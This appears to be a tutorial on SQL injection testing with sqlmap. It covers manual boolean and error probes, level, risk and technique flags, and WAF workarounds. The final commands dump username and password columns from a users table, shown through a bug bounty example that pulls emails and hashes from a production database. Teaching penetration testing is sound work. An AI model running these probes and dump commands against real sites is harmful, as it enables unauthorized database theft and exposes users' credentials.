First rule (VERY IMPORTANT)

👉 Never start with sqlmap blindly

Always:

Manually test for SQLi (error, boolean, time-based)
Confirm injection
THEN use sqlmap

Otherwise:

You waste time
You create noise
You may get blocked
⚙️ Basic command explained
sqlmap -u "http://example.com/product?id=1" --dbs --batch
🔍 What each part means:
-u → Target URL
id=1 → Parameter you suspect is injectable
--dbs → Extract database names
--batch → Auto “yes” to prompts (non-interactive)
🌍 Real-world scenario (step-by-step)
🎯 Target
https://shop.example.com/product?id=10
🧪 Step 1: Manual testing

Try:

?id=10'

If you see:

SQL error → good sign

Try boolean:

?id=10 AND 1=1   → normal
?id=10 AND 1=2   → different response

👉 If response changes → SQL injection confirmed

🚀 Step 2: Run sqlmap
sqlmap -u "https://shop.example.com/product?id=10" --dbs --batch
💥 What happens:
sqlmap tests injection types
identifies DB type (MySQL, PostgreSQL, etc.)
extracts database names

Example output:

available databases:
- information_schema
- shop_db
- users_db
🔧 Advanced flags (IMPORTANT)
1. --level (1–5)

👉 Controls how many places sqlmap tests

Level	What it tests
1	URL params only
2	+ cookies
3	+ User-Agent
4	+ Referer
5	+ more headers
Example:
sqlmap -u "URL" --level=5

👉 Useful when:

injection is hidden in headers/cookies
2. --risk (1–3)

👉 Controls how aggressive payloads are

Risk	Behavior
1	Safe
2	Medium
3	Aggressive (can modify data!)
Example:
sqlmap -u "URL" --risk=3

⚠️ Risk 3 may:

run heavy queries
potentially affect database
3. --technique

👉 Choose which SQLi techniques to use

Letter	Technique
B	Boolean-based
E	Error-based
U	UNION query
S	Stacked queries
T	Time-based
Example:
sqlmap -u "URL" --technique=BEU

👉 Only uses:

Boolean
Error
UNION
🔥 Real-world usage flow
Case: WAF blocking requests

Start safe:

sqlmap -u "URL?id=1" --dbs --batch

If nothing found →

Increase depth:

sqlmap -u "URL?id=1" --level=5 --risk=2 --dbs

Still nothing →

Try specific technique:

sqlmap -u "URL?id=1" --technique=T --time-sec=5

👉 Useful for blind SQLi

🧪 Dumping data (real attack step)

After finding DB:

sqlmap -u "URL?id=1" -D shop_db --tables

Then:

sqlmap -u "URL?id=1" -D shop_db -T users --columns

Then:

sqlmap -u "URL?id=1" -D shop_db -T users -C username,password --dump
💥 Real bug bounty scenario

A researcher finds:

/api/user?uid=1002

Manual test:

uid=1002 AND 1=2

→ Response changes → SQLi confirmed

Then:

sqlmap -u "https://target.com/api/user?uid=1002" --dbs

Finds:

prod_db

Then dumps:

sqlmap -u "..." -D prod_db -T users --dump

👉 Gets:

emails
hashed passwords

💰 Report → High severity bounty

🚫 Common beginner mistakes

❌ Running sqlmap without confirming SQLi
❌ Using --risk=3 on live targets immediately
❌ Ignoring cookies/session (missing auth bugs)
❌ Not using Burp request (-r) for complex apps

🧠 Pro tip (VERY useful)

For logged-in apps:

Capture request in Burp
Save to file → request.txt

Then:

sqlmap -r request.txt --dbs

👉 This is how real testers use it

🧩 Final takeaway
sqlmap = automation tool, not magic
Your brain finds the bug
sqlmap extracts data efficiently
